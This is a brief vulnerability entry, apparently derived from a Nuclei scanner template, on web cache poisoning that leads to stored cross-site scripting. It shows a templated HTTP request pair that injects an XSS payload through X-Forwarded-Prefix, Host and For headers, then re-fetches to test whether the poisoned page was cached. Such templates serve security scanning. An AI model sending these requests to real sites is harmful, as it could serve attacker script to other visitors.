# Vulnerability: Cache Poisoning - Stored XSS
**Classification:** CWE-80
**Source:** Nuclei Template (`cache-poisoning-xss.yaml`)

## Description
Cache Poisoning leads to Stored XSS.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /?{{cache_key}}=1 HTTP/1.1
Host: {{Hostname}}
X-Forwarded-Prefix: {{cache_header}}.xfp{{xss_payload}}
X-Forwarded-Host: {{cache_header}}.xfh{{xss_payload}}
X-Forwarded-For: {{cache_header}}.xff{{xss_payload}}

GET /?{{cache_key}}=1 HTTP/1.1
Host: {{Hostname}}
```

